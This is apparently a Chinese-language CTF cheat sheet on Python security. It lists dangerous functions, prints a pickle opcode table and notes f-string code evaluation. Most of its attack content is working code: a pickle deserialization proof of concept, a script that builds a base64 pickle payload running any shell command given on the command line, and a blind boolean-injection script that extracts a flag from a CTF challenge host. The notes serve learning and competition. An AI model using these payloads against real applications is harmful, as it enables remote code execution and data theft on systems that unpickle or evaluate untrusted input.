# Python

## 攻击面

```python
eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen,platform.popen
```

## Pickle

### RCE
poc
```
class Exploit(object):
    def __reduce__(self):
        return (os.system,('ls',))
```
利用脚本

```
import _pickle as cPickle
import sys
import base64

COMMAND = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

print(base64.b64encode(cPickle.dumps(PickleRce())))
```

## repr() 函数将对象转化为供解释器读取的形式

可以与php serialize()类比

## opcode 的一些操作

输出opcode表

```
import pickletools
import prettytable
 
opcode_table = prettytable.PrettyTable()
opcode_table.field_names = ['Name', 'Code', 'Docs']
for opcode in pickletools.opcodes:
    opcode_table.add_row([opcode.name, opcode.code, opcode.doc.splitlines()[0]])
    
print(opcode_table)
```

```
+------------------+------+-----------------------------------------------------------------+
|       Name       | Code |                               Docs                              |
+------------------+------+-----------------------------------------------------------------+
|       INT        |  I   |                     Push an integer or bool.                    |
|      BININT      |  J   |                 Push a four-byte signed integer.                |
|     BININT1      |  K   |                Push a one-byte unsigned integer.                |
|     BININT2      |  M   |                Push a two-byte unsigned integer.                |
|       LONG       |  L   |                       Push a long integer.                      |
|      LONG1       |      |               Long integer using one-byte length.               |
|      LONG4       |      |              Long integer using found-byte length.              |
|      STRING      |  S   |                   Push a Python string object.                  |
|    BINSTRING     |  T   |                   Push a Python string object.                  |
| SHORT_BINSTRING  |  U   |                   Push a Python string object.                  |
|     BINBYTES     |  B   |                   Push a Python bytes object.                   |
|  SHORT_BINBYTES  |  C   |                   Push a Python bytes object.                   |
|    BINBYTES8     |      |                   Push a Python bytes object.                   |
|    BYTEARRAY8    |      |                 Push a Python bytearray object.                 |
|   NEXT_BUFFER    |      |                Push an out-of-band buffer object.               |
| READONLY_BUFFER  |      |                    Push True onto the stack.                    |
|     NEWFALSE     |      |                    Push False onto the stack.                   |
|     UNICODE      |  V   |               Push a Python Unicode string object.              |
| SHORT_BINUNICODE |      |               Push a Python Unicode string object.              |
|    BINUNICODE    |  X   |               Push a Python Unicode string object.              |
|   BINUNICODE8    |      |               Push a Python Unicode string object.              |
|      FLOAT       |  F   |            Newline-terminated decimal float literal.            |
|     BINFLOAT     |  G   |        Float stored in binary form, with 8 bytes of data.       |
|    EMPTY_LIST    |  ]   |                       Push an empty list.                       |
|      APPEND      |  a   |                   Append an object to a list.                   |
|     APPENDS      |  e   |            Extend a list by a slice of stack objects.           |
|       LIST       |  l   |  Build a list out of the topmost stack slice, after markobject. |
|   EMPTY_TUPLE    |  )   |                       Push an empty tuple.                      |
|      TUPLE       |  t   | Build a tuple out of the topmost stack slice, after markobject. |
|      TUPLE1      |      |     Build a one-tuple out of the topmost item on the stack.     |
|      TUPLE2      |      |     Build a two-tuple out of the top two items on the stack.    |
|      TUPLE3      |      |   Build a three-tuple out of the top three items on the stack.  |
|    EMPTY_DICT    |  }   |                       Push an empty dict.                       |
|       DICT       |  d   |  Build a dict out of the topmost stack slice, after markobject. |
|     SETITEM      |  s   |            Add a key+value pair to an existing dict.            |
|     SETITEMS     |  u   | Add an arbitrary number of key+value pairs to an existing dict. |
|    EMPTY_SET     |      |                        Push an empty set.                       |
|     ADDITEMS     |      |  Build a frozenset out of the topmost slice, after markobject.  |
|       POP        |  0   |   Discard the top stack item, shrinking the stack by one item.  |
|       DUP        |  2   |  Push the top stack item onto the stack again, duplicating it.  |
|       MARK       |  (   |                 Push markobject onto the stack.                 |
|     POP_MARK     |  1   |  Pop all the stack objects at and above the topmost markobject. |
|       GET        |  g   |      Read an object from the memo and push it on the stack.     |
|      BINGET      |  h   |      Read an object from the memo and push it on the stack.     |
|   LONG_BINGET    |  j   |      Read an object from the memo and push it on the stack.     |
|       PUT        |  p   |   Store the stack top into the memo.  The stack is not popped.  |
|      BINPUT      |  q   |   Store the stack top into the memo.  The stack is not popped.  |
|   LONG_BINPUT    |  r   |   Store the stack top into the memo.  The stack is not popped.  |
|     MEMOIZE      |      |   Store the stack top into the memo.  The stack is not popped.  |
|       EXT1       |      |                         Extension code.                         |
|       EXT2       |      |                         Extension code.                         |
|       EXT4       |      |                         Extension code.                         |
|      GLOBAL      |  c   |         Push a global object (module.attr) on the stack.        |
|   STACK_GLOBAL   |      |         Push a global object (module.attr) on the stack.        |
|      REDUCE      |  R   |   Push an object built from a callable and an argument tuple.   |
|      BUILD       |  b   |   Finish building an object, via __setstate__ or dict update.   |
|       INST       |  i   |                     Build a class instance.                     |
|       OBJ        |  o   |                     Build a class instance.                     |
|      NEWOBJ      |      |                    Build an object instance.                    |
|    NEWOBJ_EX     |      |                    Build an object instance.                    |
|      PROTO       |      |                   Protocol version indicator.                   |
|       STOP       |  .   |                   Stop the unpickling machine.                  |
|      FRAME       |      |              Indicate the beginning of a new frame.             |
|      PERSID      |  P   |          Push an object identified by a persistent ID.          |
|    BINPERSID     |  Q   |          Push an object identified by a persistent ID.          |
+------------------+------+-----------------------------------------------------------------+
```

Example:

```python
import pickle 
#import sys
import base64
import pickletools

#COMMAND = "ls"

class PickleRce(object):
    def __init__(self):
        super(PickleRce, self).__init__()
        self.id = 1
        self.name ="eki"
    #def __reduce__(self):
    #    import os
    #    return (os.system,(COMMAND,))
x = PickleRce()
s = pickle.dumps(x)

pickletools.dis(s)
```
### 参考资料

绕过 RestrictedUnpickler：http://blog.nsfocus.net/%e7%bb%95%e8%bf%87-restrictedunpickler/

从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势  https://zhuanlan.zhihu.com/p/89132768

## 字符串bool

```
>>> 'a' and True
True
>>> 'a' and False
False
>>> True and False
False
>>> 'a' or False
'a'
>>> True or False
True
>>> False or True
True
```

存在类似SQL Bool Blind的注入

```python
#coding=utf-8
import requests
import time
import sys
import string

pt= string.printable

url="http://992b9ff2-9950-49ec-8925-4fa34293d8a6.node3.buuoj.cn/"

ret = "flag{"
url = url + "cgi-bin/pycalx.py"

while True:
    l = 1
    r = 128
    while(l+1<r):
        mid = (l+r) / 2
        tmp=ret+chr(mid)
        data = {
            'value1': 'a',
            'op': '+\'',
            'value2': 'and source>FLAG#',
            'source': tmp
        }
        req=requests.post(url,data=data)
        #print req.text
        if (req.status_code != requests.codes.ok):
            continue
        if "True" in req.text:
            r=mid
        else :
            l=mid
    if(chr(l) not in pt):
        break
    ret=ret+chr(l)
    sys.stdout.write("[-]Result : -> {0} <-\r".format(ret))
    sys.stdout.flush()

print("[+]Result : ->"+ret+"<-")
```

## 浮点数比较

``float()``

``inf,nan,infinity``

## python3 ``f'{}'``

在python3.6中，将字符串用{}引起来，加上引号，并且前面加个f就可以把{}中的字符串当做代码执行

``f"{__import__('time').sleep(1)}"``

## 拓展资料

Hackergame2019 不同寻常的 Python 考试 ：
https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%B8%8D%E5%90%8C%E5%AF%BB%E5%B8%B8%E7%9A%84_Python_%E8%80%83%E8%AF%95/README.md